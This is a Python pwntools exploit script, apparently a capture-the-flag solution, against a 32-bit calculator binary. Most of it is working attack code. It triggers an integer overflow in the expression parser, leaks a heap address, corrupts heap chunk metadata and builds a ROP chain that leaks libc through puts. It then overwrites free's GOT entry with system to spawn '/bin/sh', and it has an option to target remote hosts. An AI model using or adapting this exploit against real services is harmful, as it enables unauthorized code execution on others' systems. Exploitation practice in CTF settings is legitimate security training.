#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("./calc_patched")
libc = ELF("./libc.so.6")
gs = """
# b *0x0804A169
# b *0x0804AAF3
# b *0x0804A5B6
# b *0x0804AAD9
# b *0x80485b2
"""


def start():
    if args.LOCAL:
        p = e.process()
    elif args.REMOTE:
        p = remote(args.HOST, int(args.PORT))
    return p


p = start()

if args.GDB:
    gdb.attach(p, gdbscript=gs)


p.sendafter(b"INPUT >>",
            b"99999999999*99999999"
            )
p.sendafter(b'>> ', p32(0)*0xe+p32(0x1f0))

p.recvuntil(b"P 0x")
victim = int(p.recvline().decode(), 16)
heap = victim - 0x530
log.success(f"heap @ {hex(heap)}")

usr_info = 0x0804D4A4
sp_count = 0x0804D06C
debug_mode = 0x0804D0A0
usr_inp = heap + 0x160


p.sendlineafter(b"INPUT >>",
                b"("*255 + b"99999999999*99999999" + b')'*255 +
                p16(0)+p32(0) +
                p32(0)+p32(0x21)
                )

target = heap+0x380


p.sendafter(b'>> ', p32(3)+p32(2)+p32(target))


target1 = target+0x40
pre_ = b"("*255 + b"99999999999*99999999" + b')' * 255


p.sendlineafter(b"INPUT >>",
                b'\0'*len(pre_) +
                p16(0)+p32(0) +
                p32(0)+p32(0x21) + p32(usr_info-4) + p32(0)
                )

sleep(0.3)

p.sendlineafter(b"INPUT >>",
                f"((((({e.got.free}*999999999999999999*999999999999999999".encode() +
                p8(0)*0x10 + b"/bin/sh\0"
                )
sleep(0.5)
pause()
#                   ret
p.sendafter(b'>> ', p32(0x0804859a)+p32(e.plt.strdup+6) +
            p32(e.plt.memcpy+6)+p32(0x0804B11D)+p32(0)+p32(0x0804B0CF))

sleep(0.5)


ebx_ret = 0x080485b1

p.send(
    p8(0)*24 +
    p32(e.plt.puts) +
    p32(ebx_ret) +
    p32(e.got.puts) +
    p32(e.plt.read) +
    p32(0x804a813) +  # pop pop ret
    p32(0) +
    p32(e.got.free) +
    p32(e.plt.free) +
    p32(e.plt.exit) +
    p32(heap+0x1a4)
)
libc.address = 0
libc.address = u32(p.recv(4)) - libc.sym.puts

log.success(f"libc @ {hex(libc.address)}")

sleep(0.5)

p.sendline(
    p32(libc.sym.system)
)

p.interactive()
